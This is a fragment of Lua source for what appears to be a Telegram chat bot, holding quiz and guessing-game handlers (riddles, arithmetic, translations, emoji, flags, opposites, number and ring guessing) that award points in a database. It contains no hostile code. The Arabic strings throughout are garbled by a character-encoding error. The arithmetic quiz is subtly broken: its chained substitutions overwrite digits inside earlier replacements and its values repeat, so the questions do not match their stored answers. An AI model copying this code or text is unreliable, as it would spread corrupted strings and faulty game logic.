name = string.gsub(name,"Ψ§ΩΩΩΩ","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩΨͺΨ¨ ΩΩΨ§ ΩΩΨ±Ψ£ Ψ")
name = string.gsub(name,"Ψ§ΩΩΨ΄Ψ·","ΩΩ Ψ£Ψ³ΩΨ§Ω ΩΩΨ§ ΩΨΉΨΆ ΩΨ§ ΩΩ Ψ ")
name = string.gsub(name,"Ψ§ΩΨ­ΩΨ±Ω","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§Ψ°Ψ§ Ψ£Ψ?Ψ°ΩΨ§ ΩΩΩ Ψ§Ψ²Ψ―Ψ§Ψ― ΩΩΨ¨Ψ± Ψ")
name = string.gsub(name,"Ψ§ΩΨ¨Ψ­Ψ±","ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΨ±ΩΨΉ Ψ§Ψ«ΩΨ§Ω ΩΩΨ§ ΩΩΨ―Ψ± ΩΨ±ΩΨΉ ΩΨ³ΩΨ§Ψ± Ψ")
name = string.gsub(name,"Ψ§ΩΨ«ΩΨ¬","Ψ§ΩΨ§ Ψ§Ψ¨Ω Ψ§ΩΩΨ§Ψ‘ ΩΨ§Ω ΨͺΨ±ΩΩΩΩ ΩΩ Ψ§ΩΩΨ§Ψ‘ ΩΨͺ ΩΩΩ Ψ§ΩΨ§ Ψ")
name = string.gsub(name,"Ψ§ΩΨ§Ψ³ΩΩΨ¬","ΩΩΩ Ψ«ΩΩΨ¨ ΩΩΨΉ Ψ°Ψ§ΩΩ Ψ§Ψ­ΩΨΆ Ψ§ΩΩΨ§Ψ‘ ΩΩΩ Ψ§ΩΩΩ Ψ")
name = string.gsub(name,"Ψ§ΩΨ΅ΩΨͺ","Ψ§Ψ³ΩΨ± Ψ¨ΩΨ§ Ψ±Ψ¬ΩΩΩ ΩΩΨ§ Ψ§Ψ―Ψ?Ω Ψ§ΩΨ§ Ψ¨Ψ§ΩΨ§Ψ°ΩΩΩ ΩΩΩ Ψ§ΩΨ§ Ψ")
name = string.gsub(name,"Ψ¨ΩΩ","Ψ­Ψ§ΩΩ ΩΩΨ­ΩΩΩ ΩΨ΅Ω ΩΨ§Ψ΄Ω ΩΩΨ΅Ω ΩΨ¨ΩΩΩ ΩΩΩ Ψ§ΩΩΩ Ψ ")
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ³Ψ±ΨΉ ΩΨ§Ψ­Ψ― ΩΨ­Ω Ψ§ΩΨ­Ψ²ΩΨ±Ω β\n {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak:Klam:Hzor"..msg.chat_id_) or "").."" and not database:get(bot_id.."Tshak:Set:Hzora"..msg.chat_id_) then
if not database:get(bot_id.."Tshak:Set:Hzora"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nΩ­ ΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ­Ψ²ΩΨ±Ω }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1) 
end
database:set(bot_id.."Tshak:Set:Hzora"..msg.chat_id_,true)
end 
if text == 'Ψ±ΩΨ§ΨΆΩΨ§Ψͺ' then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
Hussein = {'9','2','60','9','5','4','25','10','17','15','39','5','16',};
name = Hussein[math.random(#Hussein)]
database:del(bot_id..'Set:Ryadeat:Bot'..msg.chat_id_)
database:set(bot_id..':Set:Ryadeat'..msg.chat_id_,name)
name = string.gsub(name,'9','2+7=')
name = string.gsub(name,'2','5-3=')
name = string.gsub(name,'60','(30)Β² =')
name = string.gsub(name,'9','2+2+5=')
name = string.gsub(name,'5','8-3=?')
name = string.gsub(name,'4','40Γ·10=')
name = string.gsub(name,'25','30-5=')
name = string.gsub(name,'10','100Γ·10=')
name = string.gsub(name,'17','10+5+2=')
name = string.gsub(name,'15','25-10=')
name = string.gsub(name,'39','44-5=')
name = string.gsub(name,'5','12+1-8=')
name = string.gsub(name,'16','16+16-16=')
send(msg.chat_id_, msg.id_,'Ψ§Ψ¬Ψ¨ ΨΉΩ Ψ§ΩΨͺΨ§ΩΩ ~ {'..name..'}')
return false
end
end
if text == ''..(database:get(bot_id..':Set:Ryadeat'..msg.chat_id_) or '')..'' then 
if not database:get(bot_id..'Set:Ryadeat:Bot'..msg.chat_id_) then 
database:del(bot_id..':Set:Ryadeat'..msg.chat_id_)
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nΩ­ ΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ±ΩΨ§ΨΆΩΨ§Ψͺ }")
database:incrby(bot_id..'Tshak:Add:Num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id..'Set:Ryadeat:Bot'..msg.chat_id_,true)
end
if text == 'Ψ§ΩΨ¬ΩΩΨ²Ω' then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
Hussein = {'ΩΨΉΩΩΩΨ§Ψͺ','ΩΩΩΨ§Ψͺ','ΩΨ¬ΩΩΨΉΨ§Ψͺ','ΩΨͺΨ§Ψ¨','ΨͺΩΨ§Ψ­Ω','ΩΨ?ΨͺΩΩ','Ψ³Ψ―ΩΩ','ΩΩΩΨ―','Ψ§ΨΉΩΩ','Ψ°Ψ¦Ψ¨','ΨͺΩΨ³Ψ§Ψ­','Ψ°ΩΩ',};
name = Hussein[math.random(#Hussein)]
database:del(bot_id..'Tshak:Set:SONICX'..msg.chat_id_)
database:set(bot_id..'Tshak:SONICX'..msg.chat_id_,name)
name = string.gsub(name,'Ψ°Ψ¦Ψ¨','Wolf')
name = string.gsub(name,'ΩΨΉΩΩΩΨ§Ψͺ','Information')
name = string.gsub(name,'ΩΩΩΨ§Ψͺ','Channels')
name = string.gsub(name,'ΩΨ¬ΩΩΨΉΨ§Ψͺ','Groups')
name = string.gsub(name,'ΩΨͺΨ§Ψ¨','Book')
name = string.gsub(name,'ΨͺΩΨ§Ψ­Ω','Apple')
name = string.gsub(name,'Ψ³Ψ―ΩΩ','Sydney')
name = string.gsub(name,'ΩΩΩΨ―','money')
name = string.gsub(name,'Ψ§ΨΉΩΩ','I know')
name = string.gsub(name,'ΨͺΩΨ³Ψ§Ψ­','crocodile')
name = string.gsub(name,'ΩΨ?ΨͺΩΩ','Different')
name = string.gsub(name,'Ψ°ΩΩ','Intelligent')
send(msg.chat_id_, msg.id_,'Ψ§Ψ¬Ψ¨ ΨΉΩ Ψ§ΩΨͺΨ§ΩΩ ~ { '..name..' }')
return false
end
end
if text == ""..(database:get(bot_id.."Tshak:SONICX"..msg.chat_id_) or "").."" and not database:get(bot_id.."Tshak:Set:SONICX"..msg.chat_id_) then
if not database:get(bot_id.."Tshak:Set:SONICX"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nΩ­ ΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ§ΩΨ¬ΩΩΨ²Ω }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1) 
end
database:set(bot_id.."Tshak:Set:SONICX"..msg.chat_id_,true)
end 
if text == "ΩΨΉΨ§ΩΩ" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Tshak:Set:Maany"..msg.chat_id_)
Maany_Rand = {"ΩΨ±Ψ―","Ψ―Ψ¬Ψ§Ψ¬Ω","Ψ¨Ψ·Ψ±ΩΩ","ΨΆΩΨ―ΨΉ","Ψ¨ΩΩΩ","ΩΨ­ΩΩ","Ψ―ΩΩ","Ψ¬ΩΩ","Ψ¨ΩΨ±Ω","Ψ―ΩΩΩΩΩ","ΨͺΩΨ³Ψ§Ψ­","ΩΨ±Ψ΄","ΩΩΨ±","Ψ§Ψ?Ψ·Ψ¨ΩΨ·","Ψ³ΩΩΩ","Ψ?ΩΨ§Ψ΄","Ψ§Ψ³Ψ―","ΩΨ£Ψ±","Ψ°Ψ¦Ψ¨","ΩΨ±Ψ§Ψ΄Ω","ΨΉΩΨ±Ψ¨","Ψ²Ψ±Ψ§ΩΩ","ΩΩΩΨ°","ΨͺΩΨ§Ψ­Ω","Ψ¨Ψ§Ψ°ΩΨ¬Ψ§Ω"}
name = Maany_Rand[math.random(#Maany_Rand)]
database:set(bot_id.."Tshak:Maany"..msg.chat_id_,name)
name = string.gsub(name,"ΩΨ±Ψ―","π")
name = string.gsub(name,"Ψ―Ψ¬Ψ§Ψ¬Ω","π")
name = string.gsub(name,"Ψ¨Ψ·Ψ±ΩΩ","π§")
name = string.gsub(name,"ΨΆΩΨ―ΨΉ","πΈ")
name = string.gsub(name,"Ψ¨ΩΩΩ","π¦")
name = string.gsub(name,"ΩΨ­ΩΩ","π")
name = string.gsub(name,"Ψ―ΩΩ","π")
name = string.gsub(name,"Ψ¬ΩΩ","π«")
name = string.gsub(name,"Ψ¨ΩΨ±Ω","π")
name = string.gsub(name,"Ψ―ΩΩΩΩΩ","π¬")
name = string.gsub(name,"ΨͺΩΨ³Ψ§Ψ­","π")
name = string.gsub(name,"ΩΨ±Ψ΄","π¦")
name = string.gsub(name,"ΩΩΨ±","π")
name = string.gsub(name,"Ψ§Ψ?Ψ·Ψ¨ΩΨ·","π")
name = string.gsub(name,"Ψ³ΩΩΩ","π")
name = string.gsub(name,"Ψ?ΩΨ§Ψ΄","π¦")
name = string.gsub(name,"Ψ§Ψ³Ψ―","π¦")
name = string.gsub(name,"ΩΨ£Ψ±","π­")
name = string.gsub(name,"Ψ°Ψ¦Ψ¨","πΊ")
name = string.gsub(name,"ΩΨ±Ψ§Ψ΄Ω","π¦")
name = string.gsub(name,"ΨΉΩΨ±Ψ¨","π¦")
name = string.gsub(name,"Ψ²Ψ±Ψ§ΩΩ","π¦")
name = string.gsub(name,"ΩΩΩΨ°","π¦")
name = string.gsub(name,"ΨͺΩΨ§Ψ­Ω","π")
name = string.gsub(name,"Ψ¨Ψ§Ψ°ΩΨ¬Ψ§Ω","π")
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ³Ψ±ΨΉ ΩΨ§Ψ­Ψ― ΩΨ±Ψ³Ω ΩΨΉΩΩ Ψ§ΩΨ³ΩΨ§ΩΩ ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak:Maany"..msg.chat_id_) or "").."" and not database:get(bot_id.."Tshak:Set:Maany"..msg.chat_id_) then
if not database:get(bot_id.."Tshak:Set:Maany"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nΩ­ ΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ ΩΨΉΨ§ΩΩ }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1) 
end
database:set(bot_id.."Tshak:Set:Maany"..msg.chat_id_,true)
end 
if text == "Ψ§ΨΉΩΨ§Ω" or text == "Ψ§ΨΉΩΨ§Ω ΩΨ―ΩΩ" or text == "Ψ§ΨΉΩΨ§Ω Ω Ψ―ΩΩ" or text == "Ψ―ΩΩ" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Tshak:Set:Country"..msg.chat_id_)
Country_Rand = {"ΩΨ΅Ψ±","Ψ§ΩΨΉΨ±Ψ§Ω","Ψ§ΩΨ³ΨΉΩΨ―ΩΩ","Ψ§ΩΩΨ§ΩΩΨ§","ΨͺΩΩΨ³","Ψ§ΩΨ¬Ψ²Ψ§Ψ¦Ψ±","ΩΩΨ³Ψ·ΩΩ","Ψ§ΩΩΩΩ","Ψ§ΩΩΨΊΨ±Ψ¨","Ψ§ΩΨ¨Ψ­Ψ±ΩΩ","ΩΨ±ΩΨ³Ψ§","Ψ³ΩΩΨ³Ψ±Ψ§","ΨͺΨ±ΩΩΨ§","Ψ§ΩΨ¬ΩΨͺΨ±Ψ§","Ψ§ΩΩΩΨ§ΩΨ§Ψͺ Ψ§ΩΩΨͺΨ­Ψ―Ω","ΩΩΨ―Ψ§","Ψ§ΩΩΩΩΨͺ","ΩΩΨ¨ΩΨ§","Ψ§ΩΨ³ΩΨ―Ψ§Ω","Ψ³ΩΨ±ΩΨ§"}
name = Country_Rand[math.random(#Country_Rand)]
database:set(bot_id.."Tshak:Country"..msg.chat_id_,name)
name = string.gsub(name,"ΩΨ΅Ψ±","πͺπ¬")
name = string.gsub(name,"Ψ§ΩΨΉΨ±Ψ§Ω","π?πΆ")
name = string.gsub(name,"Ψ§ΩΨ³ΨΉΩΨ―ΩΩ","πΈπ¦")
name = string.gsub(name,"Ψ§ΩΩΨ§ΩΩΨ§","π©πͺ")
name = string.gsub(name,"ΨͺΩΩΨ³","πΉπ³")
name = string.gsub(name,"Ψ§ΩΨ¬Ψ²Ψ§Ψ¦Ψ±","π©πΏ")
name = string.gsub(name,"ΩΩΨ³Ψ·ΩΩ","π΅πΈ")
name = string.gsub(name,"Ψ§ΩΩΩΩ","πΎπͺ")
name = string.gsub(name,"Ψ§ΩΩΨΊΨ±Ψ¨","π²π¦")
name = string.gsub(name,"Ψ§ΩΨ¨Ψ­Ψ±ΩΩ","π§π­")
name = string.gsub(name,"ΩΨ±ΩΨ³Ψ§","π«π·")
name = string.gsub(name,"Ψ³ΩΩΨ³Ψ±Ψ§","π¨π­")
name = string.gsub(name,"Ψ§ΩΨ¬ΩΨͺΨ±Ψ§","π¬π§")
name = string.gsub(name,"ΨͺΨ±ΩΩΨ§","πΉπ·")
name = string.gsub(name,"Ψ§ΩΩΩΨ§ΩΨ§Ψͺ Ψ§ΩΩΨͺΨ­Ψ―Ω","π±π·")
name = string.gsub(name,"ΩΩΨ―Ψ§","π¨π¦")
name = string.gsub(name,"Ψ§ΩΩΩΩΨͺ","π°πΌ")
name = string.gsub(name,"ΩΩΨ¨ΩΨ§","π±πΎ")
name = string.gsub(name,"Ψ§ΩΨ³ΩΨ―Ψ§Ω","πΈπ©")
name = string.gsub(name,"Ψ³ΩΨ±ΩΨ§","πΈπΎ")
send(msg.chat_id_, msg.id_,"β’ Ψ§Ψ³Ψ±ΨΉ ΩΨ§Ψ­Ψ― ΩΨ±Ψ³Ω Ψ§Ψ³Ω Ψ§ΩΨ―ΩΩΩ ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak:Country"..msg.chat_id_) or "").."" and not database:get(bot_id.."Tshak:Set:Country"..msg.chat_id_) then
if not database:get(bot_id.."Tshak:Set:Country"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"β’ Ψ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nβ’ ΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ§ΨΉΩΨ§Ω ΩΨ―ΩΩ }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1) 
end
database:set(bot_id.."Tshak:Set:Country"..msg.chat_id_,true)
end
if text == "Ψ§ΩΨΉΩΨ³" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Tshak:Set:Aks"..msg.chat_id_)
katu = {"Ψ¨Ψ§Ω","ΩΩΩΨͺ","ΩΩΨ²ΩΩ","Ψ§Ψ³ΩΨΉΩ","Ψ§Ψ­Ψ¨Ω","ΩΩΨ­ΩΩ","ΩΨΆΩΩ","Ψ­Ψ§Ψ±Ω","ΩΨ§Ψ΅Ω","Ψ¬ΩΩ","Ψ³Ψ±ΩΨΉ","ΩΩΨ³Ω","Ψ·ΩΩΩ","Ψ³ΩΩΩ","ΨΆΨΉΩΩ","Ψ΄Ψ±ΩΩ","Ψ΄Ψ¬Ψ§ΨΉ","Ψ±Ψ­Ψͺ","ΨΉΨ―Ω","ΩΨ΄ΩΨ·","Ψ΄Ψ¨ΨΉΨ§Ω","ΩΩΨΉΨ·Ψ΄Ψ§Ω","Ψ?ΩΨ΄ ΩΩΨ―","Ψ§ΩΩ","ΩΨ§Ψ―Ψ¦"}
name = katu[math.random(#katu)]
database:set(bot_id.."Tshak:Set:Aks:Game"..msg.chat_id_,name)
name = string.gsub(name,"Ψ¨Ψ§Ω","ΩΩΩ")
name = string.gsub(name,"ΩΩΩΨͺ","ΩΨ§ΩΩΩΨͺ")
name = string.gsub(name,"ΩΩΨ²ΩΩ","Ψ²ΩΩ")
name = string.gsub(name,"Ψ§Ψ³ΩΨΉΩ","ΩΨ§Ψ³ΩΨΉΩ")
name = string.gsub(name,"Ψ§Ψ­Ψ¨Ω","ΩΨ§Ψ­Ψ¨Ω")
name = string.gsub(name,"ΩΩΨ­ΩΩ","Ψ­ΩΩ")
name = string.gsub(name,"ΩΨΆΩΩ","ΩΨ΅Ψ?")
name = string.gsub(name,"Ψ­Ψ§Ψ±Ω","Ψ¨Ψ§Ψ±Ψ―Ω")
name = string.gsub(name,"ΩΨ§Ψ΅Ω","ΨΉΨ§ΩΩ")
name = string.gsub(name,"Ψ¬ΩΩ","ΩΩΩ")
name = string.gsub(name,"Ψ³Ψ±ΩΨΉ","Ψ¨Ψ·ΩΨ‘")
name = string.gsub(name,"ΩΩΨ³Ω","ΨΆΩΨ¬Ω")
name = string.gsub(name,"Ψ·ΩΩΩ","ΩΨ²Ω")
name = string.gsub(name,"Ψ³ΩΩΩ","ΨΆΨΉΩΩ")
name = string.gsub(name,"ΨΆΨΉΩΩ","ΩΩΩ")
name = string.gsub(name,"Ψ΄Ψ±ΩΩ","ΩΩΨ§Ψ―")
name = string.gsub(name,"Ψ΄Ψ¬Ψ§ΨΉ","Ψ¬Ψ¨Ψ§Ω")
name = string.gsub(name,"Ψ±Ψ­Ψͺ","Ψ§Ψ¬ΩΨͺ")
name = string.gsub(name,"ΨΉΨ―Ω","ΩΩΨͺ")
name = string.gsub(name,"ΩΨ΄ΩΨ·","ΩΨ³ΩΩ")
name = string.gsub(name,"Ψ΄Ψ¨ΨΉΨ§Ω","Ψ¬ΩΨΉΨ§Ω")
name = string.gsub(name,"ΩΩΨΉΨ·Ψ΄Ψ§Ω","ΨΉΨ·Ψ΄Ψ§Ω")
name = string.gsub(name,"Ψ?ΩΨ΄ ΩΩΨ―","ΩΩΨ?ΩΨ΄ ΩΩΨ―")
name = string.gsub(name,"Ψ§ΩΩ","ΩΨ·Ω")
name = string.gsub(name,"ΩΨ§Ψ―Ψ¦","ΨΉΨ΅Ψ¨Ω")
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ³Ψ±ΨΉ ΩΨ§Ψ­Ψ― ΩΨ±Ψ³Ω Ψ§ΩΨΉΩΨ³ ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Tshak:Set:Aks:Game"..msg.chat_id_) or "").."" and not database:get(bot_id.."Tshak:Set:Aks"..msg.chat_id_) then
if not database:get(bot_id.."Tshak:Set:Aks"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΩ ΩΨ¨Ψ±ΩΩ ΩΩΨ― ΩΨ²Ψͺ \nΩ­ ΩΩΨΉΨ¨ ΩΨ±Ω Ψ§Ψ?Ψ±Ω Ψ§Ψ±Ψ³Ω ~{ Ψ§ΩΨΉΩΨ³ }")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1) 
end
database:set(bot_id.."Tshak:Set:Aks"..msg.chat_id_,true)
end 

if database:get(bot_id.."Tshak:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
send(msg.chat_id_, msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ’ ΩΨ§ ΩΩΩΩΩ ΨͺΨ?ΩΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ¨Ψ± ΩΩ Ψ§Ω { 20 } Ψ?ΩΩ Ψ±ΩΩ ΩΨ§ Ψ¨ΩΩ Ψ§Ω{ 1 Ω 20 }\n")
return false end 
local GETNUM = database:get(bot_id.."Tshak:GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
database:del(bot_id.."Tshak:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)
database:del(bot_id.."Tshak:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) 
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_,5) 
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ¨Ψ±ΩΩ ΩΨ²Ψͺ ΩΩΨ§ΩΩ ΩΨ?ΩΩΨͺ Ψ§ΩΨ±ΩΩ Ψ§ΩΨ΅Ψ­ΩΨ­\nΩ­ ΨͺΩ Ψ§ΨΆΨ§ΩΨ© { 5 } ΩΩ Ψ§ΩΩΩΨ§Ψ· \n")
elseif tonumber(NUM) ~= tonumber(GETNUM) then
database:incrby(bot_id.."Tshak:SADD:NUM"..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(database:get(bot_id.."Tshak:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)) >= 3 then
database:del(bot_id.."Tshak:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)
database:del(bot_id.."Tshak:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ¨Ψ³ ΩΩΨ― Ψ?Ψ³Ψ±Ψͺ ΩΩ Ψ§ΩΩΨΉΨ¨Ω \nΩ­ Ψ­ΨΈΨ’ Ψ§ΩΩΨ± ΩΩ Ψ§ΩΩΨ±Ω Ψ§ΩΩΨ§Ψ―ΩΩ \nΩ­ ΩΨ§Ω Ψ§ΩΨ±ΩΩ Ψ§ΩΨ°Ω ΨͺΩ ΨͺΨ?ΩΩΩΩ { "..GETNUM.." }")
else
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ¨Ψ³ ΨͺΨ?ΩΩΩΩ ΨΊΩΨ· \nΩ­ Ψ§Ψ±Ψ³Ω Ψ±ΩΩ ΨͺΨ?ΩΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±Ω ")
end
end
end
end
if text == "Ψ?ΩΩ" or text == "ΨͺΨ?ΩΩΩ" then 
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
Num = math.random(1,20)
database:set(bot_id.."Tshak:GAMES:NUM"..msg.chat_id_,Num) 
send(msg.chat_id_, msg.id_,"\nΩ­ Ψ§ΩΩΨ§ Ψ¨Ω ΨΉΨ²ΩΨ²Ω ΩΩ ΩΨΉΨ¨Ψ© Ψ§ΩΨͺΨ?ΩΩΩ :\nΩ΄ββββββββββ\n".."Ω­ ΩΩΨ§Ψ­ΨΈΩ ΩΨ―ΩΩ { 3 } ΩΨ­Ψ§ΩΩΨ§Ψͺ ΩΩΨ· ΩΩΨ± ΩΨ¨Ω Ψ§Ψ±Ψ³Ψ§Ω ΨͺΨ?ΩΩΩΩ \n\n".."Ω­ Ψ³ΩΨͺΩ ΨͺΨ?ΩΩΩ ΨΉΨ―Ψ― ΩΨ§ Ψ¨ΩΩ Ψ§Ω {1 Ω 20} Ψ§Ψ°Ψ§ ΨͺΨΉΨͺΩΨ― Ψ§ΩΩ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ§ΩΩΩΨ² Ψ¬Ψ±Ψ¨ ΩΨ§ΩΩΨΉΨ¨ Ψ§ΩΨ§Ω Ψ ")
database:setex(bot_id.."Tshak:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true) 
return false 
end
end

if database:get(bot_id.."Tshak:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
send(msg.chat_id_, msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΩΩΨ¬Ψ― Ψ³ΩΨ§Ψ‘ { 6 } Ψ§Ψ?ΨͺΩΨ§Ψ±Ψ§Ψͺ ΩΩΨ· Ψ§Ψ±Ψ³Ω Ψ§Ψ?ΨͺΩΨ§Ψ±Ω ΩΨ±Ω Ψ§Ψ?Ψ±Ω\n")
return false end 
local GETNUM = database:get(bot_id.."Tshak:Games:Bat"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
database:del(bot_id.."Tshak:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) 
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ¨Ψ±ΩΩ ΩΨ²Ψͺ ΩΨ·ΩΨΉΨͺ Ψ§ΩΩΨ­ΩΨ¨Ψ³ Ψ¨Ω Ψ§ΩΨ― Ψ±ΩΩ { "..NUM.." }\nπβΩΩΨ― Ψ­Ψ΅ΩΨͺ ΨΉΩΩ { 3 }ΩΩ ΩΩΨ§Ψ· ΩΩΩΩΩ Ψ§Ψ³ΨͺΨ¨Ψ―Ψ§ΩΩΩ Ψ¨Ψ±Ψ³Ψ§Ψ¦Ω ")
database:incrby(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_,3) 
elseif tonumber(NUM) ~= tonumber(GETNUM) then
database:del(bot_id.."Tshak:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) 
send(msg.chat_id_, msg.id_,"Ω­ ΩΩΨ§Ψ³Ω ΩΩΨ― Ψ?Ψ³Ψ±Ψͺ \nΩ­ Ψ§ΩΩΨ­ΩΨ¨Ψ³ Ψ¨Ω Ψ§ΩΨ― Ψ±ΩΩ { "..GETNUM.." }\nΩ­ Ψ­Ψ§ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±Ω ΩΩΨΉΨ«ΩΨ± ΨΉΩΩ Ψ§ΩΩΨ­ΩΨ¨Ψ³")
end
end
end

if text == "ΩΨ­ΩΨ¨Ψ³" or text == "Ψ¨Ψ§Ψͺ" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then 
Num = math.random(1,6)
database:set(bot_id.."Tshak:Games:Bat"..msg.chat_id_,Num) 
TEST = [[
*β β β β β β
β β β β β β
π βΉβΊ π βΉβΊ π βΉβΊ π βΉβΊ π βΉβΊ π
Ω­ Ψ§Ψ?ΨͺΨ± ΩΨ£Ψ³ΨͺΨ?Ψ±Ψ§Ψ¬ Ψ§ΩΩΨ­ΩΨ¨Ψ³ Ψ§ΩΨ§ΩΨ― Ψ§ΩΨͺΩ ΨͺΨ­ΩΩ Ψ§ΩΩΨ­ΩΨ¨Ψ³ 
Ω­ Ψ§ΩΩΨ§Ψ¦Ψ² ΩΨ­Ψ΅Ω ΨΉΩΩ { 3 } ΩΩ Ψ§ΩΩΩΨ§Ψ· *
]]
send(msg.chat_id_, msg.id_,TEST)
database:setex(bot_id.."Tshak:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true) 
return false 
end
end

if text == "Ψ§ΩΩΨ?ΨͺΩΩ" then
if database:get(bot_id.."Tshak:Lock:Games"..msg.chat_id_) then
mktlf = {"πΈ","β ","πΌ","π","π","π","β­οΈ","β¨","β","π₯","βοΈ","π¨βπ¬","π¨βπ»","π¨βπ§","π§ββ","π§ββ","π§ββ","πββ","π§ββ","π¬","π","π€","βοΈ","π",};
name = mktlf[math.random(#mktlf)]
database:del(bot_id.."Tshak:Set:Moktlf:Bot"..msg.chat_id_)
database:set(bot_id.."Tshak::Set:Moktlf"..msg.chat_id_,name)
name = string.gsub(name,"πΈ","πΉπΉπΉπΉπΉπΉπΉπΉπΈπΉπΉπΉπΉ")
name = string.gsub(name,"β ","πππππππβ πππππ")
name = string.gsub(name,"πΌ","π»π»π»πΌπ»π»π»π»π»π»π»")
name = string.gsub(name,"π","ππππππππππ")
name = string.gsub(name,"π","ππππππππ??")
name = string.gsub(name,"π","πππππππππ")
name = string.gsub(name,"β­οΈ","ππππππππβ­οΈπππ")
name = string.gsub(name,"β¨","π«π«π«π«π«β¨π«π«π«π«")
name = string.gsub(name,"β","π¨π¨π¨π¨π¨βπ¨π¨π¨π¨")
name = string.gsub(name,"π₯","βοΈβοΈβοΈβοΈβοΈβοΈπ₯βοΈβοΈβοΈβοΈ")
name = string.gsub(name,"βοΈ","βββββββοΈββββ")
name = string.gsub(name,"π¨βπ¬","π©βπ¬π©βπ¬π©βπ¬π©βπ¬π©βπ¬π©βπ¬π©βπ¬π©βπ¬π¨βπ¬π©βπ¬π©βπ¬π©βπ¬")
name = string.gsub(name,"π¨βπ»","π©βπ»π©βπ»π©ββπ»π©ββπ»π©βπ»π¨βπ»π©βπ»π©βπ»π©βπ»")
name = string.gsub(name,"π¨βπ§","π©βπ§π©βπ§π©βπ§π©βπ§π©βπ§π©βπ§π¨βπ§π©βπ§")
name = string.gsub(name,"π©βπ³","π¨βπ³π¨βπ³π¨βπ³π¨βπ³π¨βπ³π©βπ³π¨βπ³π¨βπ³π¨βπ³")
